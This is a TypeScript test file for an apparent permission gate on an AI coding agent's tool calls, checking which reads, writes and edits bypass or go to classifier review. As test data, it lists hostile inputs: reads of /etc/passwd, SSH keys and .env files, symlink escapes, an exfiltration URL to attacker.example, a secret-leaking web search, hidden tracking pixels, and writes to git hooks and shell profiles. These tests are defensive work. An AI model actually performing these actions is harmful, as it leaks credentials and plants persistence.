import assert from "node:assert/strict";
import { chmodSync, mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { homedir, tmpdir } from "node:os";
import { join } from "node:path";
import { isWorkspaceWriteFastPath, resolveReadRoots, workspaceWriteTarget } from "../../src/tool-routing.js";
import { logPath, normalizeConfig } from "../../src/extension-config.js";
import { evaluateToolCall, reviewToolResult } from "../../src/omp-host.js";
import { unreadableLspLocation } from "../../src/lsp-results.js";
import { appliedEditMismatch, cleanPreviewFiles, isLspEditApply } from "../../src/lsp-edits.js";
import { defaultRules, type CommandRules } from "../../src/command-rules.js";
import { SessionApprovalStore } from "../../src/session-approval-store.js";
import { test } from "node:test";
import { config, ctx, staticRoute, CLASSIFIER_DENY_REASON, classifierDenyOptions } from "./helpers.js";

await test("the extension's config and rules files are never written by the write fast path", () => {
  const workspace = mkdtempSync(join(tmpdir(), "omp-callgate-protect-"));
  writeFileSync(join(workspace, "rules.jsonc"), "{}");
  symlinkSync(join(workspace, "rules.jsonc"), join(workspace, "link.jsonc"));
  const previousRules = process.env.CALLGATE_RULES_PATH;
  const previousConfig = process.env.CALLGATE_CONFIG_PATH;
  try {
    const write = (path: string) => ({ path, content: "{}" });
    const protectedFiles = [join(workspace, "rules.jsonc"), join(workspace, "kube.jsonc")];
    assert.equal(isWorkspaceWriteFastPath(write("notes.txt"), workspace, protectedFiles), true);
    for (const path of ["rules.jsonc", "./rules.jsonc", "link.jsonc", "kube.jsonc", join(workspace, "rules.jsonc")]) {
      assert.equal(isWorkspaceWriteFastPath(write(path), workspace, protectedFiles), false, path);
    }
    // The static evaluator protects config.jsonc and rules.jsonc even before they exist.
    process.env.CALLGATE_RULES_PATH = join(workspace, "new-rules.jsonc");
    process.env.CALLGATE_CONFIG_PATH = join(workspace, "config.jsonc");
    const route = (path: string) =>
      staticRoute("write", write(path), { cwd: workspace, config: config(), tools: [], hasUI: false });
    assert.equal(route("notes.txt"), "workspace_write");
    assert.equal(route("new-rules.jsonc"), null);
    assert.equal(route("config.jsonc"), null);
    const rules: CommandRules = { ...defaultRules(), files: [join(workspace, "kube.jsonc")] };
    assert.equal(
      staticRoute("write", write("kube.jsonc"), { cwd: workspace, config: config(), tools: [], hasUI: false, rules }),
      null,
    );
  } finally {
    process.env.CALLGATE_RULES_PATH = previousRules;
    if (previousConfig === undefined) {
      delete process.env.CALLGATE_CONFIG_PATH;
    } else {
      process.env.CALLGATE_CONFIG_PATH = previousConfig;
    }
    rmSync(workspace, { recursive: true, force: true });
  }
});

await test("writes that create or change a program are reviewed", async () => {
  const workspace = mkdtempSync(join(tmpdir(), "omp-callgate-program-write-"));
  writeFileSync(join(workspace, "tool.sh"), "#!/bin/sh\n");
  chmodSync(join(workspace, "tool.sh"), 0o755);
  writeFileSync(join(workspace, "notes.txt"), "notes\n");
  const run = (event: { toolName: string; input: unknown }) =>
    evaluateToolCall(
      event,
      ctx({ cwd: workspace }),
      config({ reviewer: "ai" }),
      new SessionApprovalStore(),
      classifierDenyOptions(),
    );
  try {
    for (const event of [
      { toolName: "write", input: { path: "bin/rg", content: "#!/bin/sh\necho hi\n" } },
      { toolName: "write", input: { path: "notes.txt", content: "#!/usr/bin/env python3\n" } },
      { toolName: "write", input: { path: "tool.sh", content: "echo hi\n" } },
      { toolName: "edit", input: { path: "tool.sh", edits: [{ op: "update" }] } },
      { toolName: "edit", input: { path: "notes.txt", edits: [{ rename: "tool.sh" }] } },
    ]) {
      assert.deepEqual(await run(event), { block: true, reason: CLASSIFIER_DENY_REASON }, JSON.stringify(event));
    }
    for (const event of [
      { toolName: "write", input: { path: "src/lib.rs", content: "#![allow(dead_code)]\n" } },
      { toolName: "write", input: { path: "notes.txt", content: "# heading\n" } },
      { toolName: "edit", input: { path: "notes.txt", edits: [{ op: "update" }] } },
    ]) {
      assert.deepEqual(await run(event), {}, JSON.stringify(event));
    }
  } finally {
    rmSync(workspace, { recursive: true, force: true });
  }
});

await test("todo completion and wait bypass classifier review and audit local_state", async () => {
  const dir = mkdtempSync(join(tmpdir(), "omp-callgate-orchestration-"));
  const previousLogsDir = process.env.CALLGATE_LOGS_DIR;
  process.env.CALLGATE_LOGS_DIR = dir;
  let classifierCalls = 0;
  try {
    for (const event of [
      { toolName: "todo", input: { op: "done", task: "Ship the verified change" } },
      { toolName: "wait", input: {} },
    ]) {
      const result = await evaluateToolCall(
        event,
        ctx(),
        config({ reviewer: "ai", audit: true }),
        new SessionApprovalStore(),
        {
          classifierClient: async () => {
            classifierCalls += 1;
            throw new Error("local orchestration must not call classifier");
          },
        },
      );
      assert.deepEqual(result, {});
    }
    assert.equal(classifierCalls, 0);

    const entries = readFileSync(logPath(), "utf8")
      .trim()
      .split("\n")
      .map(
        (line) =>
          JSON.parse(line) as {
            toolName: string;
            route: string;
            outcome: string;
          },
      );
    assert.deepEqual(
      entries.map(({ toolName, route, outcome }) => ({ toolName, route, outcome })),
      [
        { toolName: "todo", route: "local_state", outcome: "allow" },
        { toolName: "wait", route: "local_state", outcome: "allow" },
      ],
    );
  } finally {
    if (previousLogsDir === undefined) {
      delete process.env.CALLGATE_LOGS_DIR;
    } else {
      process.env.CALLGATE_LOGS_DIR = previousLogsDir;
    }
    rmSync(dir, { recursive: true, force: true });
  }
});

await test("interactive ask without external images bypasses classifier review", async () => {
  let classifierCalled = false;
  const result = await evaluateToolCall(
    { toolName: "ask", input: { html: '<form><p>Continue?</p><img src="diagram.png" alt="Diagram"></form>' } },
    ctx({ hasUI: true }),
    config({ reviewer: "ai" }),
    new SessionApprovalStore(),
    {
      classifierClient: async () => {
        classifierCalled = true;
        throw new Error("safe interactive ask must not call classifier");
      },
    },
  );
  assert.deepEqual(result, {});
  assert.equal(classifierCalled, false);
});

await test("external-image and noninteractive ask calls remain classifier-reviewed", async () => {
  const cases = [
    {
      event: { toolName: "ask", input: { html: '<form><img src="https://example.com/pixel.png"></form>' } },
      context: ctx({ hasUI: true }),
    },
    {
      event: { toolName: "ask", input: { html: '<form><img src="//example.com/pixel.png"></form>' } },
      context: ctx({ hasUI: true }),
    },
    {
      event: {
        toolName: "ask",
        input: { html: '<form><img data-src="a.png" src="https://example.com/pixel.png"></form>' },
      },
      context: ctx({ hasUI: true }),
    },
    {
      event: { toolName: "ask", input: { html: '<form><img alt=">" src="https://example.com/pixel.png"></form>' } },
      context: ctx({ hasUI: true }),
    },
    {
      event: { toolName: "ask", input: { html: '<form><image src="https://example.com/pixel.png"></form>' } },
      context: ctx({ hasUI: true }),
    },
    {
      event: {
        toolName: "ask",
        input: { html: '<form><img src="https&colon;&sol;&sol;example.com/pixel.png"></form>' },
      },
      context: ctx({ hasUI: true }),
    },
    {
      event: { toolName: "ask", input: { html: '<form><img src="&#x68;ttps://example.com/pixel.png"></form>' } },
      context: ctx({ hasUI: true }),
    },
    {
      event: {
        toolName: "ask",
        input: { html: '<form><svg><image href="https://example.com/pixel.png"/></svg></form>' },
      },
      context: ctx({ hasUI: true }),
    },
    {
      event: { toolName: "ask", input: { html: "<form><p>Continue?</p></form>" } },
      context: ctx({ hasUI: false }),
    },
  ];
  for (const { event, context } of cases) {
    const result = await evaluateToolCall(
      event,
      context,
      config({ reviewer: "ai" }),
      new SessionApprovalStore(),
      classifierDenyOptions(),
    );
    assert.deepEqual(result, { block: true, reason: CLASSIFIER_DENY_REASON });
  }
});

await test("eval and task remain classifier-reviewed", async () => {
  for (const event of [
    { toolName: "eval", input: { language: "py", code: "print('review me')" } },
    { toolName: "task", input: { task: "Delegate arbitrary repository work" } },
  ]) {
    const result = await evaluateToolCall(
      event,
      ctx(),
      config({ reviewer: "ai" }),
      new SessionApprovalStore(),
      classifierDenyOptions(),
    );
    assert.deepEqual(result, { block: true, reason: CLASSIFIER_DENY_REASON });
  }
});

await test("configured tool exemptions bypass classifier review", async () => {
  let classifierCalled = false;
  const result = await evaluateToolCall(
    { toolName: "Custom_State", input: { value: "unfinished work" } },
    ctx(),
    config(normalizeConfig({ reviewer: "ai", reviewExemptTools: [" custom_state "] })),
    new SessionApprovalStore(),
    {
      classifierClient: async () => {
        classifierCalled = true;
        throw new Error("exempt tool must not call classifier");
      },
    },
  );
  assert.deepEqual(result, {});
  assert.equal(classifierCalled, false);
});

await test("read-only and workspace edit fast paths allow", async () => {
  const store = new SessionApprovalStore();
  assert.deepEqual(await evaluateToolCall({ toolName: "read", input: { path: "a.ts" } }, ctx(), config(), store), {});
  assert.deepEqual(
    await evaluateToolCall({ toolName: "edit", input: { path: "/tmp/workspace/a.ts" } }, ctx(), config(), store),
    {},
  );
});

await test("read-only routing does not infer from action-like tool names", async () => {
  const result = await evaluateToolCall(
    { toolName: "search_and_replace", input: { path: "/tmp/workspace/a.ts", oldText: "a", newText: "b" } },
    ctx(),
    config({ reviewer: "ai" }),
    new SessionApprovalStore(),
    classifierDenyOptions(),
  );
  assert.deepEqual(result, { block: true, reason: CLASSIFIER_DENY_REASON });
});

await test("read-only routing ignores self-declared tool metadata", async () => {
  for (const tool of [
    { name: "custom_report", isReadOnly: () => true },
    { name: "custom_report", readOnlyHint: true },
    { name: "custom_report", annotations: { readOnlyHint: true } },
    { name: "custom_report", mcpReadOnlyHint: true, sourceInfo: { source: "mcp" } },
  ]) {
    const result = await evaluateToolCall(
      { toolName: "custom_report", input: { path: "/tmp/workspace/a.ts" } },
      ctx(),
      config({ reviewer: "ai" }),
      new SessionApprovalStore(),
      { tools: [tool], ...classifierDenyOptions() },
    );
    assert.deepEqual(result, { block: true, reason: CLASSIFIER_DENY_REASON }, JSON.stringify(tool));
  }
});

await test("name-based fast paths apply only to the host's builtin tools", async () => {
  const cases = [
    { toolName: "read", input: { path: "xd://read/sources" } },
    { toolName: "read", input: { path: "a.ts" } },
    { toolName: "grep", input: { pattern: "x" } },
    { toolName: "todo", input: { op: "done", task: "x" } },
    { toolName: "wait", input: {} },
    { toolName: "ask", input: { question: "Continue?" } },
    { toolName: "lsp", input: { action: "hover", file: "a.ts", line: 1, symbol: "x" } },
    { toolName: "write", input: { path: "xd://lsp", content: '{"action":"status"}' } },
  ];
  for (const source of ["extension", "sdk", "mcp"]) {
    for (const event of cases) {
      const result = await evaluateToolCall(
        event,
        ctx({ hasUI: true }),
        config({ reviewer: "ai" }),
        new SessionApprovalStore(),
        { tools: [{ name: event.toolName, sourceInfo: { source } }], ...classifierDenyOptions() },
      );
      assert.deepEqual(result, { block: true, reason: CLASSIFIER_DENY_REASON }, `${source} ${event.toolName}`);
    }
  }
  for (const event of cases) {
    const result = await evaluateToolCall(
      event,
      ctx({ hasUI: true }),
      config({ reviewer: "ai" }),
      new SessionApprovalStore(),
      {
        tools: [
          { name: event.toolName, sourceInfo: { source: "builtin" } },
          { name: "other", sourceInfo: { source: "extension" } },
        ],
        classifierClient: async () => {
          throw new Error("builtin fast path must not call classifier");
        },
      },
    );
    assert.deepEqual(result, {}, `builtin ${event.toolName}`);
  }
  const unlisted = await evaluateToolCall(
    { toolName: "read", input: { path: "a.ts" } },
    ctx(),
    config({ reviewer: "ai" }),
    new SessionApprovalStore(),
    { tools: [{ name: "bash", sourceInfo: { source: "builtin" } }], ...classifierDenyOptions() },
  );
  assert.deepEqual(unlisted, { block: true, reason: CLASSIFIER_DENY_REASON });
});

await test("read fast path allows non-sensitive workspace targets and session-local URLs", async () => {
  const root = mkdtempSync(join(tmpdir(), "omp-callgate-read-"));
  const workspace = join(root, "workspace");
  mkdirSync(join(workspace, "src"), { recursive: true });
  try {
    const cases = [
      { toolName: "read", input: { path: "src/a.ts" } },
      { toolName: "read", input: { path: "src/a.ts:10-20" } },
      { toolName: "read", input: { path: "README.md:raw" } },
      { toolName: "read", input: { path: join(workspace, "src", "a.ts") } },
      { toolName: "read", input: { path: ".env.example" } },
      { toolName: "read", input: { path: "config/.env.sample" } },
      { toolName: "read", input: { path: "skill://commit/SKILL.md" } },
      { toolName: "read", input: { path: "rule://style" } },
      { toolName: "read", input: { path: "agent://0-Explore" } },
      { toolName: "grep", input: { pattern: "https://api.example.com", path: "." } },
      { toolName: "grep", input: { pattern: "TODO", path: '["src", "tests"]' } },
      { toolName: "grep", input: { pattern: "TODO", gitignore: true } },
      { toolName: "glob", input: { path: "src/**/*.ts", hidden: true } },
      { toolName: "find", input: { query: "auth flow", grep_keywords: ["auth"] } },
      { toolName: "ast_grep", input: { pat: "foo($A)", path: "src" } },
      { toolName: "ls", input: { paths: ["src", "."] } },
    ];
    for (const event of cases) {
      const result = await evaluateToolCall(
        event,
        ctx({ cwd: workspace }),
        config({ reviewer: "ai" }),
        new SessionApprovalStore(),
        {
          classifierClient: async () => {
            throw new Error(`classifier called for ${JSON.stringify(event)}`);
          },
        },
      );
      assert.deepEqual(result, {}, JSON.stringify(event));
    }
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

await test("read documentation topics bypass review without exempting devices or writes", async () => {
  const run = (toolName: string, path: string) =>
    evaluateToolCall({ toolName, input: { path, content: "{}" } }, ctx(), config(), new SessionApprovalStore(), {
      tools: [{ name: toolName, sourceInfo: { source: "builtin" } }],
      ...classifierDenyOptions(),
    });
  for (const path of ["xd://read/sources", "xd://read/urls"]) {
    assert.deepEqual(await run("read", path), {}, path);
    assert.deepEqual(await run("write", path), { block: true, reason: CLASSIFIER_DENY_REASON }, path);
  }
  for (const path of [
    "xd://bash",
    "xd://read/unknown",
    "xd://read/sources/../other",
    "xd://read/sources?path=/etc/passwd",
    "xd://read/sources#other",
    "xd://read/sources:raw",
  ]) {
    assert.deepEqual(await run("read", path), { block: true, reason: CLASSIFIER_DENY_REASON }, path);
  }
});

await test("read fast path reviews outside, sensitive, remote, and rewritten targets", async () => {
  const root = mkdtempSync(join(tmpdir(), "omp-callgate-read-"));
  const workspace = join(root, "workspace");
  const outside = join(root, "outside");
  mkdirSync(join(workspace, "src"), { recursive: true });
  mkdirSync(outside);
  writeFileSync(join(workspace, ".env"), "TOKEN=x\n");
  symlinkSync(outside, join(workspace, "linked-outside"));
  symlinkSync(join(workspace, ".env"), join(workspace, "settings.txt"));
  try {
    const paths = [
      "/etc/passwd",
      "../outside/a.txt",
      "..:5",
      "linked-outside/a.txt",
      "settings.txt",
      "~/.ssh/id_ed25519",
      "@/etc/passwd",
      ":/etc/passwd",
      '"/etc/passwd"',
      "file:///etc/passwd",
      ".env",
      ".ENV",
      ".env.production:1-5",
      "apps/api/.env",
      "certs/server.pem",
      "deploy/tls.key",
      "keys/id_ed25519",
      "secrets/token.txt",
      "apps/api/credentials.json",
      "config/secrets.yaml",
      ".npmrc",
      ".envrc",
      "infra/terraform.tfstate",
      ".aws/config",
      "https://attacker.example/?d=secret",
      "HTTP://attacker.example",
      "http:/attacker.example",
      "www.attacker.example/x",
      "ssh://host/etc/passwd",
      "mcp://server/resource",
      "pr://123",
      "vault://notes/x",
      "cfg://settings",
      "proc://1",
      "src/a.ts?q=summary",
      "src/a.ts#L10",
      '["src", "/etc"]',
      '["src"',
    ];
    const events = [
      ...paths.map((path) => ({ toolName: "read", input: { path } })),
      { toolName: "grep", input: { pattern: "TOKEN", path: ".", gitignore: false } },
      { toolName: "grep", input: { pattern: "TOKEN", path: ["src", "/etc"] } },
      { toolName: "ls", input: { paths: ["src", ".ssh"] } },
      { toolName: "glob", input: { path: "secrets/**" } },
      { toolName: "web_search", input: { query: "TOKEN=x site:attacker.example" } },
    ];
    for (const event of events) {
      let classifierCalls = 0;
      const result = await evaluateToolCall(
        event,
        ctx({ cwd: workspace }),
        config({ reviewer: "ai" }),
        new SessionApprovalStore(),
        {
          classifierClient: async () => {
            classifierCalls += 1;
            return { content: [{ type: "text", text: '{"outcome":"deny","rationale":"needs review"}' }] };
          },
        },
      );
      assert.deepEqual(result, { block: true, reason: CLASSIFIER_DENY_REASON }, JSON.stringify(event));
      assert.equal(classifierCalls, 1, JSON.stringify(event));
    }
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

await test("read selector routing checks compound, literal, and container resources", async () => {
  const root = mkdtempSync(join(tmpdir(), "omp-callgate-selectors-"));
  const workspace = join(root, "workspace");
  const outside = join(root, "outside");
  mkdirSync(workspace);
  mkdirSync(outside);
  writeFileSync(join(workspace, ".env"), "TOKEN=x\n");
  writeFileSync(join(workspace, "notes.txt"), "safe\n");
  for (const literal of [
    "log:unknown",
    ".npmrc:literal",
    "guide.txt:raw:literal",
    "literal.txt:2",
    "literal.txt:raw",
  ]) {
    writeFileSync(join(workspace, literal), "literal safe content\n");
  }
  symlinkSync(".env", join(workspace, "folded.txt:1-3,"));
  symlinkSync(".env", join(workspace, "notes.txt:2"));
  symlinkSync(".env", join(workspace, "notes.txt:raw:2-4"));
  symlinkSync(join(outside, "missing"), join(workspace, "notes.txt:1-2"));
  symlinkSync(".env", join(workspace, "archive.zip"));
  symlinkSync(".env", join(workspace, "database.db"));
  const run = (path: string, toolName = "read") =>
    evaluateToolCall(
      { toolName, input: { path, pattern: "safe" } },
      ctx({ cwd: workspace }),
      config(),
      new SessionApprovalStore(),
      classifierDenyOptions(),
    );
  try {
    for (const path of [
      "guide.txt:raw:2-4",
      "guide.txt:2-4:raw",
      "guide.txt:RAW:L2..L4",
      "guide.txt:2+3",
      "guide.txt:2-",
      "guide.txt:2..",
      "guide.txt:L2",
      "guide.txt:2,4-6,-8",
      "guide.txt:raw:-8",
      "guide.txt:-8:raw",
      "guide.txt:1-3,:-8",
      "guide.txt:2:4,8:10",
      "guide.txt:img",
      "guide.txt:conflicts",
      ".env.example",
      "config.example:raw:2-4",
      "server.key.example:raw",
      "log:unknown",
      ".npmrc:literal",
      "guide.txt:raw:literal",
      "guide.txt:2+",
      "literal.txt:2",
      "literal.txt:raw",
      "bundle.zip:src/guide.txt:raw:2-4",
      "bundle.tar.gz:src/guide.txt:2,4",
      "public.sqlite:items:some-key",
      "public.db3:items:42",
    ]) {
      assert.deepEqual(await run(path), {}, path);
    }
    for (const path of [
      ".env:raw:2-4",
      ".env:2-4:raw",
      ".env:RAW:L2..L4",
      ".env:2+3",
      ".env:2-",
      ".env:2..",
      ".env:L2",
      ".env:2,4-6,-8",
      ".env:raw:-8",
      ".env:-8:raw",
      ".env:1-3,:-8",
      ".env:2:4,8:10",
      ".env:img",
      ".env:conflicts",
      "folded.txt:1-3,:-8",
      ".npmrc:raw:2-4",
      "server.key:2-4:raw",
      "notes.txt:2",
      "notes.txt:1-2",
      "notes.txt:raw:2-4",
      "archive.zip:src/guide.txt:raw:2-4",
      "database.db:items:some-key",
      "bundle.zip:.env:raw:2-4",
      "bundle.zip:secrets/token.txt:2-4:raw",
      "bundle.tar.gz:src/server.key:2,4",
      "bundle.zip:../guide.txt",
      "bundle.zip:nested.zip:.npmrc:raw",
      "public.sqlite:credentials:42",
      "public.db:items:secrets",
      "public.db:items?limit=2",
      "public.db?q=SELECT+1",
      "../outside/bundle.zip:guide.txt:raw:2-4",
      "../outside/public.db:items:42",
    ]) {
      for (const toolName of ["read", "grep"]) {
        assert.deepEqual(
          await run(path, toolName),
          { block: true, reason: CLASSIFIER_DENY_REASON },
          `${toolName} ${path}`,
        );
      }
    }
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

await test("read routing preserves absolute and home-expanded symlink traversal", async () => {
  const root = mkdtempSync(join(homedir(), ".omp-callgate-selectors-"));
  const workspace = join(root, "workspace");
  const outside = join(root, "outside");
  mkdirSync(workspace);
  mkdirSync(join(outside, "nested"), { recursive: true });
  symlinkSync(join(outside, "nested"), join(workspace, "jump"));
  mkdirSync(join(workspace, "deep", "nested"), { recursive: true });
  symlinkSync(join(workspace, "deep", "nested"), join(workspace, "internal"));
  const run = (path: string) =>
    evaluateToolCall(
      { toolName: "read", input: { path } },
      ctx({ cwd: workspace }),
      config(),
      new SessionApprovalStore(),
      classifierDenyOptions(),
    );
  try {
    const absolute = `${workspace}/jump/../notes.txt:raw:2-4`;
    const homeExpanded = `~${absolute.slice(homedir().length)}`;
    for (const path of [absolute, homeExpanded, "jump/../notes.txt:2-4:raw"]) {
      assert.deepEqual(await run(path), { block: true, reason: CLASSIFIER_DENY_REASON }, path);
    }
    assert.deepEqual(await run(`${workspace}/ordinary/../guide.txt:raw:2-4`), {});
    // The host normalizes relative paths, but preserves absolute inputs.
    const relative = "internal/../../notes.txt";
    assert.deepEqual(await run(`${workspace}/${relative}:raw:2-4`), {});
    assert.deepEqual(await run(`${relative}:raw:2-4`), { block: true, reason: CLASSIFIER_DENY_REASON });
    const writable = workspaceWriteTarget(workspace);
    assert.equal(writable(`${workspace}/${relative}`), true);
    assert.equal(writable(relative), false);
    const protectedTarget = workspaceWriteTarget(workspace, ["internal/../protected.txt"]);
    assert.equal(protectedTarget("deep/protected.txt"), false);
    assert.equal(protectedTarget("protected.txt"), false);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

await test("unresolvable protected paths close the entire write predicate", () => {
  const root = mkdtempSync(join(tmpdir(), "omp-callgate-protected-"));
  symlinkSync("loop", join(root, "loop"));
  try {
    const writable = workspaceWriteTarget(root, ["loop"]);
    assert.equal(writable("notes.txt"), false);
    assert.equal(writable("other.txt"), false);
    assert.equal(isWorkspaceWriteFastPath({ path: "notes.txt", content: "safe" }, root, ["loop"]), false);
    assert.equal(workspaceWriteTarget(root, ["protected.txt"])("notes.txt"), true);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

await test("workspace write fast path rejects symlink escape", async () => {
  const root = mkdtempSync(join(tmpdir(), "omp-callgate-symlink-"));
  const workspace = join(root, "workspace");
  const outside = join(root, "outside");
  mkdirSync(workspace);
  mkdirSync(outside);
  symlinkSync(outside, join(workspace, "linked-outside"));
  try {
    const result = await evaluateToolCall(
      { toolName: "edit", input: { path: join(workspace, "linked-outside", "a.ts") } },
      ctx({ cwd: workspace }),
      config({ reviewer: "ai" }),
      new SessionApprovalStore(),
      {
        classifierClient: async () => ({
          content: [{ type: "text", text: '{"outcome":"deny","rationale":"outside workspace"}' }],
        }),
      },
    );
    assert.deepEqual(result, {
      block: true,
      reason:
        "The approval classifier rejected this action. Reason: outside workspace Do not retry the same action unless the user explicitly approves it.",
    });
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

await test("workspace write fast path canonicalizes relative and traversal paths", async () => {
  const root = mkdtempSync(join(tmpdir(), "omp-callgate-paths-"));
  const workspace = join(root, "workspace");
  const outside = join(root, "outside");
  mkdirSync(join(workspace, "src"), { recursive: true });
  mkdirSync(outside);
  writeFileSync(join(workspace, "src", "a.ts"), "");
  try {
    const store = new SessionApprovalStore();
    assert.deepEqual(
      await evaluateToolCall(
        { toolName: "edit", input: { path: "src/a.ts" } },
        ctx({ cwd: workspace }),
        config({ reviewer: "ai" }),
        store,
      ),
      {},
    );

    const outsideResult = await evaluateToolCall(
      { toolName: "edit", input: { path: "../outside/a.ts" } },
      ctx({ cwd: workspace }),
      config({ reviewer: "ai" }),
      new SessionApprovalStore(),
      classifierDenyOptions(),
    );
    assert.deepEqual(outsideResult, { block: true, reason: CLASSIFIER_DENY_REASON });
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

await test("workspace write fast path rejects protected entries, rewritten path forms, and outside renames", async () => {
  const root = mkdtempSync(join(tmpdir(), "omp-callgate-protected-"));
  const workspace = join(root, "workspace");
  mkdirSync(join(workspace, "src"), { recursive: true });
  mkdirSync(join(workspace, ".git"));
  mkdirSync(join(root, "outside"));
  writeFileSync(join(workspace, "src", "a.ts"), "");
  symlinkSync(join(workspace, ".git"), join(workspace, "linked-git"));
  try {
    const reviewed = [
      { toolName: "edit", input: { path: ".git/config" } },
      { toolName: "write", input: { path: join(workspace, ".git", "hooks", "pre-commit") } },
      { toolName: "write", input: { path: "src/.GIT/config" } },
      { toolName: "write", input: { path: "linked-git/config" } },
      { toolName: "write", input: { path: ".omp/settings.json" } },
      { toolName: "write", input: { path: ".pi/settings.json" } },
      { toolName: "write", input: { path: ".envrc" } },
      { toolName: "write", input: { path: ".vscode/tasks.json" } },
      { toolName: "write", input: { path: ".claude/settings.json" } },
      { toolName: "write", input: { path: "packages/web/.claude/settings.local.json" } },
      { toolName: "write", input: { path: ".mcp.json" } },
      { toolName: "write", input: { path: ".husky/pre-commit" } },
      { toolName: "write", input: { path: ".idea/workspace.xml" } },
      { toolName: "write", input: { path: ".cursor/mcp.json" } },
      { toolName: "write", input: { path: ".devcontainer/devcontainer.json" } },
      { toolName: "write", input: { path: ".codex/config.toml" } },
      { toolName: "write", input: { path: ".codex/tools/probe.ts" } },
      { toolName: "write", input: { path: ".gemini/settings.json" } },
      { toolName: "write", input: { path: ".opencode/plugins/probe.js" } },
      { toolName: "write", input: { path: ".windsurf/mcp_config.json" } },
      { toolName: "write", input: { path: "mcp.json" } },
      { toolName: "write", input: { path: "opencode.json" } },
      { toolName: "write", input: { path: "opencode.jsonc" } },
      { toolName: "write", input: { path: "ssh.json" } },
      { toolName: "write", input: { path: ".ssh.json" } },
      { toolName: "write", input: { path: "lsp.json" } },
      { toolName: "write", input: { path: ".lsp.json" } },
      { toolName: "write", input: { path: "lsp.yaml" } },
      { toolName: "write", input: { path: ".lsp.yaml" } },
      { toolName: "write", input: { path: "lsp.yml" } },
      { toolName: "write", input: { path: "packages/web/.LSP.yml" } },
      { toolName: "write", input: { path: "node_modules/typescript/lib/tsserver.js" } },
      { toolName: "edit", input: { path: "packages/web/node_modules/.bin/eslint" } },
      { toolName: "write", input: { path: ".venv/lib/python3.13/site-packages/pylsp/__init__.py" } },
      { toolName: "write", input: { path: "venv/bin/activate" } },
      { toolName: "write", input: { path: ".env/bin/pyright-langserver" } },
      { toolName: "write", input: { path: ".env" } },
      { toolName: "edit", input: { path: "config/.env.production" } },
      { toolName: "write", input: { path: "certs/server.pem" } },
      { toolName: "write", input: { path: "secrets/token.txt" } },
      { toolName: "write", input: { path: "[../outside/a.ts]" } },
      { toolName: "write", input: { path: "[src/a.ts#ABCDEF]" } },
      { toolName: "write", input: { path: "~/.bashrc" } },
      { toolName: "write", input: { path: "xd://notes" } },
      { toolName: "edit", input: { path: "src/a.ts", edits: [{ op: "update", rename: "../outside/a.ts" }] } },
      { toolName: "edit", input: { path: "src/a.ts", edits: [{ rename: ".git/hooks/pre-commit" }] } },
      { toolName: "edit", input: { path: "src/a.ts", file_path: "../outside/a.ts" } },
      { toolName: "edit", input: { input: "*** Begin Patch\n*** Update File: src/a.ts\n*** End Patch" } },
    ];
    for (const event of reviewed) {
      const result = await evaluateToolCall(
        event,
        ctx({ cwd: workspace }),
        config({ reviewer: "ai" }),
        new SessionApprovalStore(),
        classifierDenyOptions(),
      );
      assert.deepEqual(result, { block: true, reason: CLASSIFIER_DENY_REASON }, JSON.stringify(event));
    }

    const allowed = [
      { toolName: "edit", input: { path: "src/a.ts", edits: [{ op: "update", rename: "src/b.ts" }] } },
      { toolName: "write", input: { path: "app/[slug]/page.tsx" } },
      { toolName: "write", input: { path: ".github/workflows/check.yml" } },
      { toolName: "write", input: { path: ".gitignore" } },
      { toolName: "write", input: { path: ".env.example" } },
      { toolName: "write", input: { path: "docs/claude.md" } },
      { toolName: "write", input: { path: "src/lsp.ts" } },
      { toolName: "write", input: { path: "docs/mcp.json.md" } },
      { toolName: "write", input: { path: "config/lsp.json.example" } },
      { toolName: "write", input: { path: "src/node_modules_list.ts" } },
      { toolName: "write", input: { path: "src/venvs.ts" } },
    ];
    for (const event of allowed) {
      const result = await evaluateToolCall(
        event,
        ctx({ cwd: workspace }),
        config({ reviewer: "ai" }),
        new SessionApprovalStore(),
        {
          classifierClient: async () => {
            throw new Error("workspace write fast path should not call classifier");
          },
        },
      );
      assert.deepEqual(result, {}, JSON.stringify(event));
    }
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

await test("lsp queries and edit previews skip review; applied edits, builds and raw requests do not", async () => {
  const root = mkdtempSync(join(tmpdir(), "omp-callgate-lsp-"));
  const workspace = join(root, "workspace");
  mkdirSync(join(workspace, "src"), { recursive: true });
  mkdirSync(join(root, "outside"));
  writeFileSync(join(workspace, "src", "a.ts"), "export const x = 1;\n");
  try {
    const route = (input: unknown, toolName = "lsp") =>
      staticRoute(toolName, input, { cwd: workspace, config: config(), tools: [], hasUI: false });
    const file = "src/a.ts";
    const skip = [
      { action: "status" },
      { action: "capabilities" },
      { action: "symbols", file: "*", query: "Config" },
      { action: "symbols", file },
      { action: "hover", file, line: 1, symbol: "x" },
      { action: "definition", file, line: 1, symbol: "x", timeout: 30 },
      { action: "references", file: join(workspace, file), line: 1, symbol: "x" },
      { action: "type_definition", file, line: 1 },
      { action: "implementation", file, line: 1 },
      { action: "diagnostics", file },
      { action: "rename", file, line: 1, symbol: "x", new_name: "y", apply: false },
      { action: "rename_file", file, new_name: "src/b.ts", apply: false },
      { action: "code_actions", file, line: 1 },
      { action: "code_actions", file, line: 1, query: "quickfix", apply: false },
    ];
    for (const input of skip) {
      assert.equal(route(input), "lsp_read", JSON.stringify(input));
    }
    const reviewed = [
      // Runs cargo check, npx tsc, go build or pyright in the workspace.
      { action: "diagnostics", file: "*" },
      // A glob can match files the read fast path would not read.
      { action: "diagnostics", file: "src/*.ts" },
      // Applied edits: the language server picks the files.
      { action: "rename", file, line: 1, symbol: "x", new_name: "y" },
      { action: "rename", file, line: 1, symbol: "x", new_name: "y", apply: true },
      { action: "rename_file", file, new_name: "src/b.ts" },
      { action: "code_actions", file, line: 1, query: "0", apply: true },
      { action: "reload" },
      { action: "request", file, query: "workspace/executeCommand", payload: "{}" },
      // Paths the read fast path would not read.
      { action: "hover", file: ".env", line: 1 },
      { action: "hover", file: "../outside/a.ts", line: 1 },
      { action: "rename_file", file, new_name: "../outside/b.ts", apply: false },
      { action: "symbols", file: "~/.ssh/config" },
      { action: "hover", file: 42 },
